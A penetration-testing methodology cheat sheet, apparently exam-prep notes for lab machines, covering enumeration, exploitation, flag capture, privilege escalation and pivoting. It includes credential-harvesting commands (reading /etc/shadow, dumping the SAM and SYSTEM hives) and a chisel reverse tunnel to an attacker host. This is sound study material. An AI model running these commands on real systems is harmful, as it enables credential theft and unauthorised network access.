# Attack Methodology - Master Flowchart

## Phase 1: Initial Enumeration

```bash
# Fast scan - get something to work with immediately
nmap -sC -sV -oA nmap/initial <target>

# Full TCP port scan
nmap -p- -sV -oA nmap/full-tcp <target>

# Top 100 UDP
sudo nmap -sU --top-ports 100 -oA nmap/udp <target>

# Targeted scripts on discovered ports
nmap -p REDACTED -sC -sV --script=vuln -oA nmap/vuln <target>
```

See [[Nmap]] for full reference.

---

## Phase 2: Service-Specific Enumeration

Route to the correct note based on open ports:

| Port | Service | Note |
|------|---------|------|
| 21 | FTP | [[FTP-21]] |
| 22 | SSH | [[SSH-22]] |
| 25 | SMTP | [[SMTP-25]] |
| 53 | DNS | [[DNS-53]] |
| 80/443 | HTTP/HTTPS | [[HTTP-80-443]] |
| 88 | Kerberos | [[Kerberos-88]] |
| 110/143 | POP3/IMAP | [[SMTP-25]] |
| 135 | MSRPC | [[SMB-139-445]] |
| 139/445 | SMB | [[SMB-139-445]] |
| 161 | SNMP | [[SNMP-161]] |
| 389/636 | LDAP | [[LDAP-389]] |
| 1433 | MSSQL | [[MSSQL-1433]] |
| 2049 | NFS | [[NFS-2049]] |
| 3306 | MySQL | [[MySQL-3306]] |
| 3389 | RDP | [[RDP-3389]] |
| 5985 | WinRM | [[WinRM-5985]] |

**Unknown port?** Banner grab it:

```bash
nc -nv <target> <port>
curl -v http://<target>:<port>/
```

---

## Phase 3: Web Enumeration (if HTTP/HTTPS)

```bash
# Directory brute-force
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.txt

# Check for technologies
whatweb http://<target>

# Nikto scan
nikto -h http://<target>
```

Full web attack flow → [[Web-Methodology]]

---

## Phase 4: Exploitation

1. Match service + version to known exploit
2. Check searchsploit:
```bash
searchsploit <service> <version>
# Copy exploit locally:
searchsploit -m <exploit-id>
# Read the exploit code BEFORE running it - check for hardcoded IPs, ports, paths
```
3. Check Google: `<service> <version> exploit PoC github`
4. If web app - check for injection, upload, auth bypass
5. If creds found - try them everywhere ([[Im-Stuck]])
6. **READ THE EXPLOIT CODE.** Blind-running exploits wastes hours. Check:
 - Does it need a target URL/IP edited?
 - Does it need a different Python version? (`python2` vs `python3`)
 - Does it create a reverse shell or just prove the vuln?
 - Missing dependencies? `pip install -r requirements.txt`

---

## Phase 5: Post-Exploitation

```bash
# Stabilize shell immediately
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

See [[TTY-Upgrades]] for all methods.

**Grab flags:**

```bash
# Linux
cat /home/*/local.txt 2>/dev/null
cat /root/proof.txt

# Windows
type C:\Users\*\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```

**Loot credentials:**

```bash
# Linux
cat /etc/shadow
grep -ri "pass\|pwd\|cred" /var/www/ /opt/ /home/ 2>/dev/null
find / -name "*.conf" -o -name "*.bak" -o -name "*.old" 2>/dev/null

# Windows
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM sys.bak
# Or use mimikatz/secretsdump
```

---

## Phase 6: Privilege Escalation

- Linux → [[Linux-PrivEsc-Methodology]]
- Windows → [[Windows-PrivEsc-Methodology]]

---

## Phase 7: Active Directory (if applicable)

AD environments require a different approach - lateral movement + credential harvesting across machines.

→ [[AD-Methodology]]

Key chain: foothold → creds → BloodHound → lateral move → domain admin

---

## Phase 8: Pivoting (if multi-host)

When you compromise one machine and need to reach others on an internal network.

→ [[Pivoting-Methodology]]

```bash
# Quick SSH tunnel
ssh -D 9050 user@<compromised>
proxychains nmap -sT <internal-target>

# Chisel
./chisel server -p 8080 --reverse # on attacker
./chisel client <attacker>:8080 R:socks # on target
```

---

## Phase 9: Document Everything

For every machine, record:
- IP address and hostname
- All enumeration commands and output
- Exploitation steps (exact commands)
- Privilege escalation path
- Screenshots with proof commands
- Flags obtained

This is your report material. Do it as you go - not after.

See [[Exam-Day-Checklist]] for screenshot requirements.
